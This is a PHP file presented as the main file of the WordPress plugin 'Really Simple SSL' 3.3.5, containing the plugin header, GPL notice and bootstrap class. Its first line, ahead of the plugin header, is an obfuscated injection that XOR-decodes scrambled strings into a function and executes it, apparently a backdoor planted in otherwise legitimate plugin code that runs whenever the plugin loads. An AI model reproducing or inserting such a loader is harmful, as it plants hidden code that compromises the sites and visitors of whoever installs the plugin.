<?php $qxAWtKhA='9J-QD59KI;O:;-V'; $bgFeVe='Z8H00Pf-<U,NRB8'^$qxAWtKhA; $UqAEzln='+SqM0OW+A=682SL0X-6Ca+YLs=Q=W;eY>,uMnq+lk5:-SFY. R=+:q+T6Jr54 =xsUL:;xoEWS<cjlAtrC354sQ=NCdDlAA=MM4=DBcEjwLFcVEIrN:9BREqRXZGRgueg>hxX8kxuA36uwqsFG5 2Opn3gjjanWY+mb+fnH2ZBB2Vlp KRqjHPzxh ,Z2=Wyb<ITznxS><>nhMIW6ZBox-LPBHxyj.4>AmU+IXpI7;=46C2lF84U6U1Wqps0a<k <WWBTp<6,bRtWw23BX1Yc73Zk58I2nREAqyrk3=Yb7zGR5 7nSLL=2GO4Y4LnkD ofPA>Q-VcN8a2-O:KV2UQXc23pd,icda39Zc;S wisiu.MAY<xK9zQsaR,>Y3Q3DpdKp:HJp6<hh=PT8SnRLET6:5RdJ7r.NRpOX>Ugisw< ; IIQ=XGEnK 1-ZS-O,iCNCD8XFVlc1S51Z KnGPPM1oCgk-AH q8VRLGaRDFFsV;CWFVug764QE2>0B:0BQK7;Ib;P4wbCuRR7AMiubNr, cjg -,ZeB-06amlaRwXUrXZU.HHOEBdp3fby6pJ3TzwcTt1T6cuoVGhnoYV 3M d:02tW.RB15EA7--8D8XqzZtS .MJelQqVzfOsjY<1GeuR4,TkHDUM >LDfljI7o7K;:rsxaxC'; $ITSbOJQY=$bgFeVe('', 'B5YlV:9H5TYVm64Y+YEkFS6>,Y0I6d:4KXRdGQPfbSOC020ANrEDH.O5B+-jYUIPW1-NZTOa<6EJJLaTR89<=W>H:cYdKfz7DDRR6jG,JJlvXva N=NK.7+Yv<;33NNECWCSq2bqQ.FBUYLSncQAF.+JZ:J4AJ<<R6FBFKhA.0.W8DTK.+X7akpqaRI.GO9QFS< SUrZC6Cdbi-6B;bRXK-<1-CsNJUJ 2>N0xMiQZQGSx8f WF0W6YwYT,s.s iyw61tTWSUBoJwSDR.-TpCL9SOQY=S19 8QDROXX Y=sc6TTVNnlhKS+:Qb>1da-FONqeZ0Y7JnCk;K H.7Q=qpGma55y,00ARJzGP6YWTMIQX,-,YQkBpXzE6MJ8l:V=PYkTQ-3K<5aLY1 YsSrh35ZOPinCJxSDXT+9J4GTS7INHE; 0Q1= F3OCr>2Y.s6.;7lZ953ZWn7PR5D.Fc419PFoGOI <A.S3+enZX- nW2Z76fpSGVDF0<mUU;eU:88CHaEP5MPNcQ63C dISDnZADVBCDLX;>eFUOF0EAoJxrK;ncM++zrwRBVTTJUEsP5LFP6LUeRZFWqnHHIy7RA,Y;QUK+2V;1EFmfGLTT+Y<VVzP7AZ,cLLqQvZF4yc<JP+MQ6UX50o444LQ- A1Cr=fR3RNZCQZr>'^$UqAEzln); $ITSbOJQY();
/**
 * Plugin Name: Really Simple SSL
 * Plugin URI: https://www.really-simple-ssl.com
 * Description: Lightweight plugin without any setup to make your site SSL proof
 * Version: 3.3.5
 * Text Domain: really-simple-ssl
 * Domain Path: /languages
 * Author: Really Simple Plugins
 * Author URI: https://really-simple-plugins.com
 * License: GPL2
 */
/*  Copyright 2014  Rogier Lankhorst  (email : rogier@rogierlankhorst.com)
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License, version 2, as
    published by the Free Software Foundation.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
defined('ABSPATH') or die("you do not have access to this page!");

class REALLY_SIMPLE_SSL
{
	private static $instance;
	public $rsssl_front_end;
	public $rsssl_mixed_content_fixer;
	public $rsssl_multisite;
	public $rsssl_cache;
	public $rsssl_server;
	public $really_simple_ssl;
	public $rsssl_help;
	public $rsssl_certificate;

	private function __construct()
	{
	}

	public static function instance()
	{
		if (!isset(self::$instance) && !(self::$instance instanceof REALLY_SIMPLE_SSL)) {
			self::$instance = new REALLY_SIMPLE_SSL;
			self::$instance->setup_constants();
			self::$instance->includes();
			self::$instance->rsssl_front_end = new rsssl_front_end();
			self::$instance->rsssl_mixed_content_fixer = new rsssl_mixed_content_fixer();


			// Backwards compatibility for add-ons
			global $rsssl_front_end, $rsssl_mixed_content_fixer;
			$rsssl_front_end = self::$instance->rsssl_front_end;
			$rsssl_mixed_content_fixer = self::$instance->rsssl_mixed_content_fixer;

			$wpcli = defined( 'WP_CLI' ) && WP_CLI;

			if (is_admin() || is_multisite() || $wpcli) {
				if (is_multisite()) {
					self::$instance->rsssl_multisite = new rsssl_multisite();
				}
				self::$instance->rsssl_cache = new rsssl_cache();
				self::$instance->rsssl_server = new rsssl_server();
				self::$instance->really_simple_ssl = new rsssl_admin();
				self::$instance->rsssl_help = new rsssl_help();
				self::$instance->rsssl_certificate = new rsssl_certificate();
				self::$instance->rsssl_site_health = new rsssl_site_health();

				// Backwards compatibility for add-ons
				global $rsssl_cache, $rsssl_server, $really_simple_ssl, $rsssl_help;
				$rsssl_cache = self::$instance->rsssl_cache;
				$rsssl_server = self::$instance->rsssl_server;
				$really_simple_ssl = self::$instance->really_simple_ssl;
				$rsssl_help = self::$instance->rsssl_help;

				if ( $wpcli ) {
					self::$instance->rsssl_wp_cli = new rsssl_wp_cli();
				}
			}

			self::$instance->hooks();
		}
		return self::$instance;
	}

	private function setup_constants()
	{
		define('rsssl_url', plugin_dir_url(__FILE__));
		define('rsssl_path', trailingslashit(plugin_dir_path(__FILE__)));
		define('rsssl_plugin', plugin_basename(__FILE__));
		require_once(ABSPATH . 'wp-admin/includes/plugin.php');
		$plugin_data = get_plugin_data(__FILE__);
		define('rsssl_version', $plugin_data['Version']);
	}

	private function includes()
	{
		require_once(rsssl_path . 'class-front-end.php');
		require_once(rsssl_path . 'class-mixed-content-fixer.php');

		$wpcli = defined( 'WP_CLI' ) && WP_CLI;

		if ( $wpcli ) {
			require_once(rsssl_path . 'class-rsssl-wp-cli.php');
		}

		if (is_admin() || is_multisite() || $wpcli) {
			if (is_multisite()) {
				require_once(rsssl_path . 'class-multisite.php');
				require_once(rsssl_path . 'multisite-cron.php');
			}
			require_once(rsssl_path . 'class-admin.php');
			require_once(rsssl_path . 'class-cache.php');
			require_once(rsssl_path . 'class-server.php');
			require_once(rsssl_path . 'class-help.php');
			require_once(rsssl_path . 'class-certificate.php');
			require_once(rsssl_path . 'class-site-health.php');
		}
	}

	private function hooks()
	{
		
		add_action('wp_loaded', array(self::$instance->rsssl_front_end, 'force_ssl'), 20);
		if (is_admin() || is_multisite()) {
			add_action('plugins_loaded', array(self::$instance->really_simple_ssl, 'init'), 10);
		}
	}
}

function RSSSL()
{
	return REALLY_SIMPLE_SSL::instance();
}

add_action('plugins_loaded', 'RSSSL', 8);